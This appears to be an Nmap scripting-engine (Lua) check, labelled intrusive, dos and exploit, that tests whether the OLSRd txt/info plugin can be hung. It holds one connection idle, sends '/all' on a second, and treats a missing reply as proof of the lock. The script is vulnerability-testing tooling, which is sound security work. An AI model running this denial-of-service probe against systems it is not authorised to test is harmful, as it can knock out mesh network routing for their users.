local math = require("math")
local stdnse = require("stdnse")

author = "Gioacchino Mazzurco"

license = "Same as Nmap--See http://nmap.org/book/man-legal.html"

description = [[
Test if OLSRd txt plugin is vulnerable to daemon lock via *info plugins
]]

categories = { "intrusive", "dos", "exploit" }

portrule = function(host, port)
  local identd = nmap.get_port_state(host, port)
  
  return identd ~= nil
    and identd.state == "open"
    and port.protocol == "tcp"
    and port.state == "open"
end

action = function(host, port)
  local success = false
  local sock1 = nmap.new_socket()
  sock1:connect(host,port)
  stdnse.sleep(1)

  local sock2 = nmap.new_socket()
  sock2:connect(host, port)
  sock2:send("/all")
  stdnse.sleep(1)
  success = not sock2:receive()

  sock1:close()
  sock2:close()

  if success then return "OLSRd vulnerable to info lock" end

  return success
end
